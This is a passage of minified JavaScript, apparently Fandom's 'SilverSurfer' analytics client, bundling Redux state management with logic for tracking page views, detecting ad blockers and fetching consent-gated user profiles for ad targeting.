n=null!=arguments[e]?arguments[e]:{};e%2?An(Object(n),!0).forEach((function(e){xn(t,e,n[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(n)):An(Object(n)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(n,e))}))}return t}function Dn(t){return"Minified Redux error #"+t+"; visit https://redux.js.org/Errors?code="+t+" for the full message or use the non-minified dev environment for full errors. "}var kn="function"==typeof Symbol&&Symbol.observable||"@@observable",Pn=function(){return Math.random().toString(36).substring(7).split("").join(".")},Cn={INIT:"@@redux/INIT"+Pn(),REPLACE:"@@redux/REPLACE"+Pn(),PROBE_UNKNOWN_ACTION:function(){return"@@redux/PROBE_UNKNOWN_ACTION"+Pn()}};function Rn(t,e,n){var r;if("function"==typeof e&&"function"==typeof n||"function"==typeof n&&"function"==typeof arguments[3])throw new Error(Dn(0));if("function"==typeof e&&void 0===n&&(n=e,e=void 0),void 0!==n){if("function"!=typeof n)throw new Error(Dn(1));return n(Rn)(t,e)}if("function"!=typeof t)throw new Error(Dn(2));var o=t,i=e,a=[],s=a,c=!1;function u(){s===a&&(s=a.slice())}function l(){if(c)throw new Error(Dn(3));return i}function d(t){if("function"!=typeof t)throw new Error(Dn(4));if(c)throw new Error(Dn(5));var e=!0;return u(),s.push(t),function(){if(e){if(c)throw new Error(Dn(6));e=!1,u();var n=s.indexOf(t);s.splice(n,1),a=null}}}function f(t){if(!function(t){if("object"!=typeof t||null===t)return!1;for(var e=t;null!==Object.getPrototypeOf(e);)e=Object.getPrototypeOf(e);return Object.getPrototypeOf(t)===e}(t))throw new Error(Dn(7));if(void 0===t.type)throw new Error(Dn(8));if(c)throw new Error(Dn(9));try{c=!0,i=o(i,t)}finally{c=!1}for(var e=a=s,n=0;n<e.length;n++)(0,e[n])();return t}return f({type:Cn.INIT}),(r={dispatch:f,subscribe:d,getState:l,replaceReducer:function(t){if("function"!=typeof t)throw new Error(Dn(10));o=t,f({type:Cn.REPLACE})}})[kn]=function(){var t,e=d;return(t={subscribe:function(t){if("object"!=typeof t||null===t)throw new Error(Dn(11));function n(){t.next&&t.next(l())}return n(),{unsubscribe:e(n)}}})[kn]=function(){return this},t},r}function Nn(){for(var t=arguments.length,e=new Array(t),n=0;n<t;n++)e[n]=arguments[n];return 0===e.length?function(t){return t}:1===e.length?e[0]:e.reduce((function(t,e){return function(){return t(e.apply(void 0,arguments))}}))}function Tn(){for(var t=arguments.length,e=new Array(t),n=0;n<t;n++)e[n]=arguments[n];return function(t){return function(){var n=t.apply(void 0,arguments),r=function(){throw new Error(Dn(15))},o={getState:n.getState,dispatch:function(){return r.apply(void 0,arguments)}},i=e.map((function(t){return t(o)}));return r=Nn.apply(void 0,i)(n.dispatch),jn(jn({},n),{},{dispatch:r})}}}function Ln(t){return function(e){var n=e.dispatch,r=e.getState;return function(e){return function(o){return"function"==typeof o?o(n,r,t):e(o)}}}}var Bn=Ln();Bn.withExtraArgument=Ln;const Mn=Bn;var Un,Fn=(Un=function(t,e){return(Un=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)Object.prototype.hasOwnProperty.call(e,n)&&(t[n]=e[n])})(t,e)},function(t,e){if("function"!=typeof e&&null!==e)throw new TypeError("Class extends value "+String(e)+" is not a constructor or null");function n(){this.constructor=t}Un(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)}),zn=function(t,e){for(var n=0,r=e.length,o=t.length;n<r;n++,o++)t[o]=e[n];return t},Vn=Object.defineProperty,$n=(Object.defineProperties,Object.getOwnPropertyDescriptors,Object.getOwnPropertySymbols),Hn=Object.prototype.hasOwnProperty,Wn=Object.prototype.propertyIsEnumerable,Gn=function(t,e,n){return e in t?Vn(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n},Kn=function(t,e){for(var n in e||(e={}))Hn.call(e,n)&&Gn(t,n,e[n]);if($n)for(var r=0,o=$n(e);r<o.length;r++)n=o[r],Wn.call(e,n)&&Gn(t,n,e[n]);return t},qn="undefined"!=typeof window&&window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__?window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__:function(){if(0!==arguments.length)return"object"==typeof arguments[0]?Nn:Nn.apply(null,arguments)};"undefined"!=typeof window&&window.__REDUX_DEVTOOLS_EXTENSION__&&window.__REDUX_DEVTOOLS_EXTENSION__;var Jn=function(t){function e(){for(var n=[],r=0;r<arguments.length;r++)n[r]=arguments[r];var o=t.apply(this,n)||this;return Object.setPrototypeOf(o,e.prototype),o}return Fn(e,t),Object.defineProperty(e,Symbol.species,{get:function(){return e},enumerable:!1,configurable:!0}),e.prototype.concat=function(){for(var e=[],n=0;n<arguments.length;n++)e[n]=arguments[n];return t.prototype.concat.apply(this,e)},e.prototype.prepend=function(){for(var t=[],n=0;n<arguments.length;n++)t[n]=arguments[n];return 1===t.length&&Array.isArray(t[0])?new(e.bind.apply(e,zn([void 0],t[0].concat(this)))):new(e.bind.apply(e,zn([void 0],t.concat(this))))},e}(Array);function Yn(t,e){function n(){for(var n=[],r=0;r<arguments.length;r++)n[r]=arguments[r];if(e){var o=e.apply(void 0,n);if(!o)throw new Error("prepareAction did not return an object");return Kn(Kn({type:t,payload:o.payload},"meta"in o&&{meta:o.meta}),"error"in o&&{error:o.error})}return{type:t,payload:n[0]}}return n.toString=function(){return""+t},n.type=t,n.match=function(e){return e.type===t},n}function Xn(t){var e,n={},r=[],o={addCase:function(t,e){var r="string"==typeof t?t:t.type;if(r in n)throw new Error("addCase cannot be called with two reducers for the same action type");return n[r]=e,o},addMatcher:function(t,e){return r.push({matcher:t,reducer:e}),o},addDefaultCase:function(t){return e=t,o}};return t(o),[n,r,e]}function Qn(t){var e=t.name;if(!e)throw new Error("`name` is a required option for createSlice");var n,r="function"==typeof t.initialState?t.initialState:In(t.initialState,(function(){})),o=t.reducers||{},i=Object.keys(o),a={},s={},c={};function u(){var e="function"==typeof t.extraReducers?Xn(t.extraReducers):[t.extraReducers],n=e[0],o=void 0===n?{}:n,i=e[1],a=void 0===i?[]:i,c=e[2],u=void 0===c?void 0:c,l=Kn(Kn({},o),s);return function(t,e,n,r){void 0===n&&(n=[]);var o,i="function"==typeof e?Xn(e):[e,n,r],a=i[0],s=i[1],c=i[2];if(function(t){return"function"==typeof t}(t))o=function(){return In(t(),(function(){}))};else{var u=In(t,(function(){}));o=function(){return u}}function l(t,e){void 0===t&&(t=o());var n=zn([a[e.type]],s.filter((function(t){return(0,t.matcher)(e)})).map((function(t){return t.reducer})));return 0===n.filter((function(t){return!!t})).length&&(n=[c]),n.reduce((function(t,n){if(n){var r;if(De(t))return void 0===(r=n(t,e))?t:r;if(ke(t))return In(t,(function(t){return n(t,e)}));if(void 0===(r=n(t,e))){if(null===t)return t;throw Error("A case reducer on a non-draftable value must not return undefined")}return r}return t}),t)}return l.getInitialState=o,l}(r,l,a,u)}return i.forEach((function(t){var n,r,i=o[t],u=e+"/"+t;"reducer"in i?(n=i.reducer,r=i.prepare):n=i,a[t]=n,s[u]=n,c[t]=r?Yn(u,r):Yn(u)})),{name:e,reducer:function(t,e){return n||(n=u()),n(t,e)},actions:c,caseReducers:a,getInitialState:function(){return n||(n=u()),n.getInitialState()}}}function Zn(t){setTimeout(t,1)}!function(){function t(t,e){var n=o[t];return n?n.enumerable=e:o[t]=n={configurable:!0,enumerable:e,get:function(){var e=this[hn];return Sn.get(e,t)},set:function(e){var n=this[hn];Sn.set(n,t,e)}},n}function e(t){for(var e=t.length-1;e>=0;e--){var o=t[e][hn];if(!o.P)switch(o.i){case 5:r(o)&&rn(o);break;case 4:n(o)&&rn(o)}}}function n(t){for(var e=t.t,n=t.k,r=bn(n),o=r.length-1;o>=0;o--){var i=r[o];if(i!==hn){var a=e[i];if(void 0===a&&!Ne(e,i))return!0;var s=n[i],c=s&&s[hn];if(c?c.t!==a:!Le(s,a))return!0}}var u=!!e[hn];return r.length!==bn(e).length+(u?0:1)}function r(t){var e=t.k;if(e.length!==t.t.length)return!0;var n=Object.getOwnPropertyDescriptor(e,e.length-1);if(n&&!n.get)return!0;for(var r=0;r<e.length;r++)if(!e.hasOwnProperty(r))return!0;return!1}var o={};!function(t,e){wn.ES5||(wn.ES5=e)}(0,{J:function(e,n){var r=Array.isArray(e),o=function(e,n){if(e){for(var r=Array(n.length),o=0;o<n.length;o++)Object.defineProperty(r,""+o,t(o,!0));return r}var i=mn(n);delete i[hn];for(var a=bn(i),s=0;s<a.length;s++){var c=a[s];i[c]=t(c,e||!!i[c].enumerable)}return Object.create(Object.getPrototypeOf(n),i)}(r,e),i={i:r?5:4,A:n?n.A:We(),P:!1,I:!1,D:{},l:n,t:e,k:o,o:null,O:!1,C:!1};return Object.defineProperty(o,hn,{value:i,writable:!0}),o},S:function(t,n,o){o?De(n)&&n[hn].A===t&&e(t.p):(t.u&&function t(e){if(e&&"object"==typeof e){var n=e[hn];if(n){var o=n.t,i=n.k,a=n.D,s=n.i;if(4===s)Ce(i,(function(e){e!==hn&&(void 0!==o[e]||Ne(o,e)?a[e]||t(i[e]):(a[e]=!0,rn(n)))})),Ce(o,(function(t){void 0!==i[t]||Ne(i,t)||(a[t]=!1,rn(n))}));else if(5===s){if(r(n)&&(rn(n),a.length=!0),i.length<o.length)for(var c=i.length;c<o.length;c++)a[c]=!1;else for(var u=o.length;u<i.length;u++)a[u]=!0;for(var l=Math.min(i.length,o.length),d=0;d<l;d++)i.hasOwnProperty(d)||(a[d]=!0),void 0===a[d]&&t(i[d])}}}}(t.p[0]),e(t.p))},K:function(t){return 4===t.i?n(t):r(t)}})}();var tr=n(7361),er=n.n(tr),nr=n(3608),rr=n.n(nr);const or="www.fandom.com",ir={[p.UNKNOWN]:[],[p.MEDIAWIKI]:["2350603","174","38969","4396","159","130814","2180","105","2237"],[p.DISCUSSIONS]:[],[p.TRIVIA]:[],[p.FANHUB]:[],[p.VIDEO]:[],[p.F2]:[]};function ar(t){return!(t<1)||rr()(0,100)<=100*t}var sr;function cr(t,e){return Rt.debug(`App state changed: ${t}->${e}`),e}!function(t){t.New="new",t.Starting="starting",t.Delayed="delayed",t.Ready="ready"}(sr||(sr={}));const ur=Qn({name:"AppSlice",initialState:{state:sr.New,config:{sendDebugLog:jt()||ar(er()(window,"_ss.sendDebugLogRate",.01)),sendGalactusRequest:jt()||It()||ar(er()(window,"_ss.sendGalactusRequestRate",1)),sendTracking:function(){const t=j(),e=ir[t.product],n=null==e?void 0:e.includes(t.productId);return ar(er()(window,"_ss.sendTrackingRate",n?1:0))}(),disableCrossdomain:At("ss_no_crossdomain=true")||function(){var t;return!!Ae()||((null===(t=null===window||void 0===window?void 0:window.location)||void 0===t?void 0:t.host)===or?(Rt.debug("Cross domain is not needed for fandom.com"),!0):er()(window,"_ss.disableCrossdomain",!1))}(),manualPageview:It()&&At("ss_no_pageview=true")||function(){const t=er()(window,"_ss.manualPageview",!1),e=w.fromWindow();let n=!1;return e.isValid||(Rt.debug("Page context is not valid! Assuming lazy load (need manual PV trigger)",e),n=!0),t||n}()},clients:[]},reducers:{starting:t=>{t.state!==sr.New&&t.state!==sr.Delayed||(t.state=cr(t.state,sr.Starting))},delayed:t=>{t.state===sr.New&&(t.state=cr(t.state,sr.Delayed))},ready:t=>{t.state===sr.Starting&&(t.state=cr(t.state,sr.Ready))},addClient:(t,e)=>{const n=e.payload;t.clients.push(n)},reboot(t){if(t.state===sr.Ready){const e=t.clients.map((t=>null==t?void 0:t.onReboot)).filter(Boolean);Zn((()=>e.forEach((t=>t()))))}}}}),lr=ur.actions,{starting:dr,ready:fr,delayed:pr,addClient:vr,reboot:gr}=ur.actions,hr=ur.reducer,yr=Qn({name:"ContextSlice",initialState:{user:g.getDefault(),page:w.getDefault(),adBlockDetected:null,adSlots:{}},reducers:{updateUser:(t,e)=>{t.user=e.payload},updatePage:(t,e)=>{t.page=e.payload},adSlotUpdate(t,e){t.adSlots[e.payload.name]=e.payload.status},adBlockDetected:(t,e)=>{t.adBlockDetected=e.payload,Rt.debug("Feature: AdBlock Detected",t.adBlockDetected)}}}),{updateUser:br,updatePage:mr,adSlotUpdate:wr,adBlockDetected:Sr}=(yr.actions,yr.actions),Or=yr.reducer;var _r,Er,Ir;(Ir=_r||(_r={})).Request="CrossDomain::Register::Request",Ir.Response="CrossDomain::Register::Response",function(t){t.Off="off",t.Initializing="initializing",t.Ready="ready"}(Er||(Er={}));function xr(t){return{id:`${t.productId}_${t.pageId}_${t.time}`,context:t.toTransport(),time:t.time,version:"2"}}function Ar(t){if("1"===(null==t?void 0:t.version)){const e=t;return w.fromTransport({p:p.MEDIAWIKI,pCat:e.vertical,pId:e.communityId,pgId:e.pageId,time:e.time})}if("2"!==(null==t?void 0:t.version))return w.getDefault();const e=t;return w.fromTransport(e.context)}const jr=Qn({name:"BrowserStorageSlice",initialState:{session:{interactions:{},actions:[],pages:[]},history:{interactions:{},actions:[],pages:[]},serviceCache:{galactusUserProfile:{},activeData:{}},local:{status:Er.Initializing,size:{localStorageSize:-1,indexedDBSize:-1}},crossdomain:{status:Er.Initializing,statusErrorMessage:null,size:{localStorageSize:-1,indexedDBSize:-1},pagesFinished:!1,actionsFinished:!1,interactionsFinished:!1}},reducers:{cacheGalactusUserProfile:(t,e)=>{t.serviceCache.galactusUserProfile[e.payload.beaconId]=e.payload.profile},cacheActiveData:(t,e)=>{t.serviceCache.activeData=e.payload.activeData},crossdomainStatus:(t,e)=>{var n;const r=e.payload.status;t.crossdomain.status!=Er.Ready&&(t.crossdomain.status=r,t.crossdomain.statusErrorMessage=r===Er.Off?null===(n=e.payload)||void 0===n?void 0:n.statusErrorMessage:"")},sessionPageViewSaved:(t,e)=>{t.session.pages.push(Ar(e.payload))},sessionActionSaved:(t,e)=>{t.session.actions.push(e.payload)},sessionAddInteraction:(t,e)=>{var n;const{interactions:r}=t.session,o=null!==(n=r[e.payload])&&void 0!==n?n:0;r[e.payload]=o+1,t.session.interactions=r},updateCrossdomainInteractions:(t,e)=>{t.history.interactions=e.payload,t.crossdomain.interactionsFinished=!0,t.crossdomain.status=Er.Ready},updateCrossdomainActions:(t,e)=>{t.history.actions=e.payload,t.crossdomain.actionsFinished=!0,t.crossdomain.status=Er.Ready},updateCrossdomainPages:(t,e)=>{t.history.pages=e.payload.map(Ar),t.crossdomain.pagesFinished=!0,t.crossdomain.status=Er.Ready},updateCrossdomainSize:(t,e)=>{t.crossdomain.size=e.payload,t.crossdomain.status=Er.Ready},updateLocalHistory:(t,e)=>{var n,r,o,i;t.history.interactions=e.payload.interactions,t.history.pages=null!==(r=null===(n=e.payload.pages)||void 0===n?void 0:n.map(Ar))&&void 0!==r?r:[],t.history.actions=null!==(i=null===(o=e.payload)||void 0===o?void 0:o.actions)&&void 0!==i?i:[],t.local.status=Er.Ready},updateLocalStorageSize:(t,e)=>{t.local.size=e.payload}}}),{cacheGalactusUserProfile:Dr,cacheActiveData:kr,crossdomainStatus:Pr,sessionPageViewSaved:Cr,sessionActionSaved:Rr,sessionAddInteraction:Nr,updateCrossdomainSize:Tr,updateCrossdomainPages:Lr,updateCrossdomainActions:Br,updateCrossdomainInteractions:Mr,updateLocalHistory:Ur,updateLocalStorageSize:Fr}=(jr.actions,jr.actions),zr=function(t){var e,n=function(t){return function(t){void 0===t&&(t={});var e=t.thunk,n=void 0===e||e,r=(t.immutableCheck,t.serializableCheck,new Jn);return n&&(function(t){return"boolean"==typeof t}(n)?r.push(Mn):r.push(Mn.withExtraArgument(n.extraArgument))),r}(t)},r=t||{},o=r.reducer,i=void 0===o?void 0:o,a=r.middleware,s=void 0===a?n():a,c=r.devTools,u=void 0===c||c,l=r.preloadedState,d=void 0===l?void 0:l,f=r.enhancers,p=void 0===f?void 0:f;if("function"==typeof i)e=i;else{if(!function(t){if("object"!=typeof t||null===t)return!1;var e=Object.getPrototypeOf(t);if(null===e)return!0;for(var n=e;null!==Object.getPrototypeOf(n);)n=Object.getPrototypeOf(n);return e===n}(i))throw new Error('"reducer" is a required argument, and must be a function or an object of functions that can be passed to combineReducers');e=function(t){for(var e=Object.keys(t),n={},r=0;r<e.length;r++){var o=e[r];"function"==typeof t[o]&&(n[o]=t[o])}var i,a=Object.keys(n);try{!function(t){Object.keys(t).forEach((function(e){var n=t[e];if(void 0===n(void 0,{type:Cn.INIT}))throw new Error(Dn(12));if(void 0===n(void 0,{type:Cn.PROBE_UNKNOWN_ACTION()}))throw new Error(Dn(13))}))}(n)}catch(t){i=t}return function(t,e){if(void 0===t&&(t={}),i)throw i;for(var r=!1,o={},s=0;s<a.length;s++){var c=a[s],u=n[c],l=t[c],d=u(l,e);if(void 0===d)throw e&&e.type,new Error(Dn(14));o[c]=d,r=r||d!==l}return(r=r||a.length!==Object.keys(t).length)?o:t}}(i)}var v=s;"function"==typeof v&&(v=v(n));var g=Tn.apply(void 0,v),h=Nn;u&&(h=qn(Kn({trace:!1},"object"==typeof u&&u)));var y=[g];return Array.isArray(p)?y=zn([g],p):"function"==typeof p&&(y=p(y)),Rn(e,d,h.apply(void 0,y))}({reducer:{App:hr,Context:Or,BrowserStorage:jr.reducer},middleware:t=>t({serializableCheck:{ignoredPaths:["App.clients","Context.user","Context.page","BrowserStorage.session.pages","BrowserStorage.history.pages"],ignoredActions:["AppSlice/addClient","ContextSlice/updateUser","ContextSlice/updatePage"]}}),devTools:{name:"SilverSurfer",trace:jt()}});var Vr=n(4908),$r=n.n(Vr),Hr="NOT_FOUND",Wr=function(t,e){return t===e};var Gr=function(t){for(var e=arguments.length,n=new Array(e>1?e-1:0),r=1;r<e;r++)n[r-1]=arguments[r];return function(){for(var e=arguments.length,r=new Array(e),o=0;o<e;o++)r[o]=arguments[o];var i,a=0,s={memoizeOptions:void 0},c=r.pop();if("object"==typeof c&&(s=c,c=r.pop()),"function"!=typeof c)throw new Error("createSelector expects an output function after the inputs, but received: ["+typeof c+"]");var u=s.memoizeOptions,l=void 0===u?n:u,d=Array.isArray(l)?l:[l],f=function(t){var e=Array.isArray(t[0])?t[0]:t;if(!e.every((function(t){return"function"==typeof t}))){var n=e.map((function(t){return"function"==typeof t?"function "+(t.name||"unnamed")+"()":typeof t})).join(", ");throw new Error("createSelector expects all input-selectors to be functions, but received the following types: ["+n+"]")}return e}(r),p=t.apply(void 0,[function(){return a++,c.apply(null,arguments)}].concat(d)),v=t((function(){for(var t=[],e=f.length,n=0;n<e;n++)t.push(f[n].apply(null,arguments));return i=p.apply(null,t)}));return Object.assign(v,{resultFunc:c,memoizedResultFunc:p,dependencies:f,lastResult:function(){return i},recomputations:function(){return a},resetRecomputations:function(){return a=0}}),v}}((function(t,e){var n,r,o="object"==typeof e?e:{equalityCheck:e},i=o.equalityCheck,a=void 0===i?Wr:i,s=o.maxSize,c=void 0===s?1:s,u=o.resultEqualityCheck,l=function(t){return function(e,n){if(null===e||null===n||e.length!==n.length)return!1;for(var r=e.length,o=0;o<r;o++)if(!t(e[o],n[o]))return!1;return!0}}(a),d=1===c?(n=l,{get:function(t){return r&&n(r.key,t)?r.value:Hr},put:function(t,e){r={key:t,value:e}},getEntries:function(){return r?[r]:[]},clear:function(){r=void 0}}):function(t,e){var n=[];function r(t){var r=n.findIndex((function(n){return e(t,n.key)}));if(r>-1){var o=n[r];return r>0&&(n.splice(r,1),n.unshift(o)),o.value}return Hr}return{get:r,put:function(e,o){r(e)===Hr&&(n.unshift({key:e,value:o}),n.length>t&&n.pop())},getEntries:function(){return n},clear:function(){n=[]}}}(c,l);function f(){var e=d.get(arguments);if(e===Hr){if(e=t.apply(null,arguments),u){var n=d.getEntries().find((function(t){return u(t.value,e)}));n&&(e=n.value)}d.put(arguments,e)}return e}return f.clearCache=function(){return d.clear()},f}));function Kr(t){return 0===Object.keys(t||{}).length}function qr(t){try{return t.reduce(((t,e)=>t+Object.keys(e).length),0)}catch(t){return 0}}var Jr=n(5578),Yr=n.n(Jr);function Xr(t){const{onReboot:e}=t;return q(t,["onReboot"])}function Qr(t,e){return(null==t?void 0:t.name)===(null==e?void 0:e.name)}const Zr=t=>t.App.state===sr.Ready,to=t=>t.App.clients,eo=t=>t.App.config.sendDebugLog,no=t=>t.App.config.manualPageview,ro=t=>t.Context.user,oo=t=>t.Context.page,io=t=>t.Context.adBlockDetected,ao=t=>t.Context.adSlots,so=t=>t.BrowserStorage.crossdomain.status,co=Gr(so,(t=>"initializing"!==t)),uo=Gr(so,(t=>t===Er.Ready)),lo=Gr((t=>t.BrowserStorage.local.status),(t=>t===Er.Ready)),fo=Gr(uo,lo,((t,e)=>t||e)),po=Gr(oo,(t=>t.BrowserStorage.session.pages),(t=>t.BrowserStorage.history.pages),((t,e,n)=>{return r=[t].concat(e).concat(n).filter(Boolean),s(r,(function(t){return t.time})).sort((function(t,e){return e.time-t.time}));var r})),vo=Gr((t=>t.BrowserStorage.session.actions),(t=>t.BrowserStorage.history.actions),((t,e)=>{return n=t.concat(e).filter(Boolean),Yr()(n,(t=>t.action.time)).sort(((t,e)=>e.action.time-t.action.time));var n})),go=t=>t.BrowserStorage.history.interactions,ho=t=>t.BrowserStorage.session.interactions,yo=Gr(ho,go,((t,e)=>function(t){const e={};return t.forEach((t=>{for(const[n,r]of Object.entries(t))e[n]?e[n]+=r:e[n]=r})),e}([t,e]))),bo=Gr(ho,go,((t,e)=>{const n=Object.keys(t),r=Object.keys(e),o=[].concat(n,r).filter(Boolean);return $r()(o)})),mo=Gr([po],(t=>{const e={};return t.forEach((t=>{if(t.isValid){const{product:n,productId:r}=t,o=e[n]||{};o[r]=(o[r]||0)+1,e[n]=o}})),e})),wo=Gr((t=>t.BrowserStorage.crossdomain.pagesFinished),(t=>t.BrowserStorage.crossdomain.actionsFinished),(t=>t.BrowserStorage.crossdomain.interactionsFinished),((t,e,n)=>t&&e&&n)),So=Gr((t=>t.App.state===sr.Starting),lo,oo,((t,e,n)=>t&&e&&!!n)),Oo=z({event:"silversurfer",category:V("silversurfer"),isDebug:function(){const t=Object.values(Et);for(let e=0;e<t.length;e++)if(At(t[e]))return!0;return!1}()}),_o=window.requestIdleCallback||function(t){let e=Date.now();return window.setTimeout((function(){t({didTimeout:!1,timeRemaining:function(){return Math.max(0,50-(Date.now()-e))}})}),1)},Eo=window.cancelIdleCallback||function(t){window.clearTimeout(t)};let Io=!1;function xo(t){return J(this,void 0,void 0,(function*(){const e=t||A();let n;if(n=(t=>e=>{var n;return null===(n=e.BrowserStorage.serviceCache.galactusUserProfile)||void 0===n?void 0:n[t]})(e)(zr.getState()),n)Rt.debug("getGalactusUserProfile: Profile read from cache",n);else{const e=yield function(t){return J(this,void 0,void 0,(function*(){return Yt()?yield function(t){return J(this,void 0,void 0,(function*(){const e=yield Ht(),n=yield null==e?void 0:e.get(zt,Wt(t));return n&&4===n.apiVersion?Z()(n,"apiVersion"):null}))}(t):Jt()?yield function(t){return J(this,void 0,void 0,(function*(){const e=localStorage.getItem(ot(t));if(e){const t=JSON.parse(e);if(t&&4===t.apiVersion)return Z()(t,"apiVersion")}return null}))}(t):null}))}(t);e&&(n=ae()(tt,e)),Rt.debug("getGalactusUserProfile: Profile read from storage",n)}return!Io&&(t=>t.App.config.sendGalactusRequest)(zr.getState())&&(Io=!0,Zn((()=>function(t){return J(this,void 0,void 0,(function*(){let e=null;const n=_o((()=>J(this,void 0,void 0,(function*(){if(!(Date.now()-0<6e4))try{const n=yield function(t){return J(this,void 0,void 0,(function*(){if(Ae())return null;try{yield xe()}catch(t){return Rt.debug("Consent not given, cannot contact Galactus"),null}try{const e=yield oe(`galactus-user-profile/profiles/${t}`);if(200===e.status){const t=yield e.json(),n=function(t){return ae()(tt,t)}(t);return Rt.debug("Galactus API response",n),L({event:"custom-galactus-api-response-full",category:"custom-galactus-api-response-full",label:"custom-galactus-api-response-full",galactusResponse:t,skipValidation:!0}),n}}catch(t){Rt.error("Failed to fetch profile",t)}return null}))}(t);if(n&&(null==n?void 0:n.profileId)){const r=JSON.stringify(n);r!==e&&(Rt.debug("getGalactusUserProfile: Profile updated from Galactus",n),zr.dispatch(Dr({beaconId:t,profile:n})),function(t,e){J(this,void 0,void 0,(function*(){const n=!!Yt()&&(yield function(t,e){return J(this,void 0,void 0,(function*(){const n=yield Ht(),r=Wt(t),o=Object.assign(Object.assign({},e),{apiVersion:4});return(yield null==n?void 0:n.put(zt,o,r))===r}))}(t,e)),r=!!Jt()&&(yield function(t,e){return J(this,void 0,void 0,(function*(){try{localStorage.setItem(ot(t),JSON.stringify(Object.assign(Object.assign({},e),{apiVersion:4})))}catch(t){return!1}return!0}))}(t,e)),o=n||r;return o||Rt.error("Failed to cache Galactus response",t,e),o}))}(t,n),e=r)}}catch(t){Rt.error("Fail to fetch data from Galactus",t),Eo(n)}}))))}))}(e)))),n}))}function Ao(t,e){var n,r,o,i;return $r()([].concat(Object.keys(null!==(o=null===(r=null===(n=null==e?void 0:e.namespaces)||void 0===n?void 0:n.adTags)||void 0===r?void 0:r.pform)&&void 0!==o?o:[]),Object.keys(null!==(i=null==t?void 0:t.pform)&&void 0!==i?i:[])).filter(Boolean))}function jo(t){var e,n,r;return(null!==(r=null===(n=null===(e=null==t?void 0:t.namespaces)||void 0===e?void 0:e.devices)||void 0===n?void 0:n.set)&&void 0!==r?r:[]).map((t=>({type:Do(t),platform:ko(t),browser:Po(t)})))}function Do(t){return t.type.toLowerCase().replace("unknown","other")}function ko(t){const e=t.os.toLowerCase(),n=t.make.toLowerCase();let r="other";return e.includes("android")&&(r="android"),n.includes("apple")&&(r="apple"),r}function Po(t){return t.browser.toLowerCase().replace("unknown","other")}function Co(t){var e,n,r,o;const i=null!==(r=null===(n=null===(e=null==t?void 0:t.namespaces)||void 0===e?void 0:e.locations)||void 0===n?void 0:n.set)&&void 0!==r?r:[],a=null===(o=null!=(s=function(t){try{var e,n=decodeURIComponent(null!=(e=x("Geo"))?e:"{}");return n?JSON.parse(n):void 0}catch(t){return}}())?s:{})||void 0===o?void 0:o.country;var s;return $r()([].concat(i.map((t=>t.country)),[a]).filter(Boolean).map((t=>t.toUpperCase())))}function Ro(t){var e,n,r,o,i,a,s,c;const u=null!==(r=null===(n=null===(e=null==t?void 0:t.namespaces)||void 0===e?void 0:e.languages)||void 0===n?void 0:n.contentLanguages)&&void 0!==r?r:[],l=null!==(a=null===(i=null===(o=null==t?void 0:t.namespaces)||void 0===o?void 0:o.languages)||void 0===i?void 0:i.acceptLanguages)&&void 0!==a?a:[],d=[null===(s=oo(zr.getState()))||void 0===s?void 0:s.pageLanguage,null===(c=ro(zr.getState()))||void 0===c?void 0:c.lang],f=[window.navigator.language.split("-")[0]],p=po(zr.getState());return $r()([].concat(u.map((t=>t.languageCode)),l.map((t=>t.languageCode)),p.map((t=>null==t?void 0:t.pageLanguage)),d,f).filter(Boolean).map((t=>t.toLowerCase())))}var No,To,Lo,Bo,Mo,Uo;function Fo(t){return 1===t?Bo.FIRST_TIME_VISITOR:t<=5?Bo.RETURNING_VISITOR:Bo.FREQUENT_VISITOR}function zo(t){const e=po(zr.getState()).length;if(e>0)return Fo(e);const n=[];return Object.values(t).forEach((t=>{n.push(Math.max.apply(null,Object.values(t)))})),Fo(Math.max.apply(null,n))}function Vo(t){return[zo(t)]}function $o(t,e){var n,r,o,i;return $r()([].concat(Object.keys(null!==(o=null===(r=null===(n=null==e?void 0:e.namespaces)||void 0===n?void 0:n.adTags)||void 0===r?void 0:r.tv)&&void 0!==o?o:[]),Object.keys(null!==(i=null==t?void 0:t.tv)&&void 0!==i?i:[])).filter(Boolean))}function Ho(t){if(t){const{media:e,gnre:n,theme:r}=t;return $r()([].concat(e?Object.keys(e):void 0,n?Object.keys(n):void 0,r?Object.keys(r):void 0).filter(Boolean))}return[]}!function(t){t.DELAYED="silver-surfer:delayed",t.READY="silver-surfer:ready"}(No||(No={})),(Uo=To||(To={})).LOADED="loaded",Uo.COLLAPSED="collapsed",Uo.BLOCKED="blocked",(Mo=Lo||(Lo={})).WIKI_CONTENT="wiki content",Mo.FEATURED_VIDEO="featured video",Mo.DISCUSSIONS="discussions",Mo.ADS="ads",function(t){t.FIRST_TIME_VISITOR="1st time visitor",t.RETURNING_VISITOR="returning visitor",t.FREQUENT_VISITOR="frequent visitor"}(Bo||(Bo={})),Qt("pathfinder",xt);const Wo=Zt("pathfinder",xt);ne(Wo);const Go=re(Wo),Ko="active-data-management-service";var qo=n(1609),Jo=n.n(qo);let Yo=0;function Xo(){var t,e;return J(this,void 0,void 0,(function*(){const n=yield function(){return J(this,void 0,void 0,(function*(){const t=A();let e=tt;return t?(e=yield xo(t),Oo.loaded({category:"galactus-user-profile-loaded",label:"galactus-user-profile-loaded |  "+((null==e?void 0:e.profileId)?"true":"false")})):Oo.loaded({category:"galactus-user-profile-failed-loaded",label:"no-beacon"}),e}))}(),r=yield function(){return J(this,void 0,void 0,(function*(){const t=(t=>t.BrowserStorage.serviceCache.activeData)(zr.getState());if(!Jo()(t)&&Date.now()-Yo<6e4)return t;const e=yield function(){return J(this,void 0,void 0,(function*(){if(Ae())return{};try{yield xe()}catch(t){return Rt.debug("Consent not given, cannot contact active-data-management-system"),{}}try{const t=yield oe(`${Ko}/profiles?cb=${Date.now()}`);if(200===t.status){const e=yield t.json();return Rt.debug("active-data-management-system API response",e),e}}catch(t){Rt.error("Failed to fetch active-data",t)}return{}}))}();return Rt.debug("getActiveData: read from ADMS",e),Yo=Date.now(),zr.dispatch(kr({activeData:e})),e}))}(),o=function(t){var e,n,r;let o=null!==(n=null===(e=null==t?void 0:t.namespaces)||void 0===e?void 0:e.adTags)&&void 0!==n?n:{};if(!Kr(o)){Rt.debug("getUserProfile: 